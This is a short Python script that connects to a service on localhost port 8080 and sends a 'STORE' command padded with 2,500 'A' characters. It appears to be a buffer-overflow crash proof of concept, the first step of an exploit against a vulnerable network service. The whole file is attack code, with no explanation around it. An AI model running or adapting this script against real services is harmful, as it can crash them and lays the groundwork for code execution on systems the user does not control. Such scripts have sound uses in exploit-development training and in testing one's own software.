#!/usr/bin/python
import socket
import time

buffer = "A" * 2500
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect(('127.0.0.1',8080))
time.sleep(1)
s.send('STORE '+buffer)
s.close()
